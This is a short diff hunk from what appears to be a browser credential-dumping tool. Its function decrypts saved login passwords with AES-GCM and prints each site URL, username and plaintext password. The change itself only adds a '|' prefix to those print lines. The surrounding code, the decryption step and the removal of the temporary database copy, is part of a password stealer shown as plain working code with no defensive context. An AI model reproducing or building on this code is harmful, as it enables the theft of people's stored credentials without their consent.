@@ -123,10 +123,10 @@ def login_data_parser(login_data_path, decryption_key):
                 cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
                 decrypted_password = cipher.decrypt(encrypted_password).decode('utf-8', errors='replace')
                 
-                print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔗 URL: [{bcolors.OKCYAN}" + origin_url + f"{bcolors.ENDC}]")
-                print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] 👤 Username: [{bcolors.OKCYAN}" + username_value + f"{bcolors.ENDC}]")
-                print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔑 Password: [{bcolors.OKCYAN}" + decrypted_password + f"{bcolors.ENDC}]")
-                print("----------------------------------")
+                print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔗 URL: [{bcolors.OKCYAN}" + origin_url + f"{bcolors.ENDC}]")
+                print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] 👤 Username: [{bcolors.OKCYAN}" + username_value + f"{bcolors.ENDC}]")
+                print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔑 Password: [{bcolors.OKCYAN}" + decrypted_password + f"{bcolors.ENDC}]")
+                print(f"| ----------------------------------")
         
         conn.close()
         os.remove(temp_login_data_path)
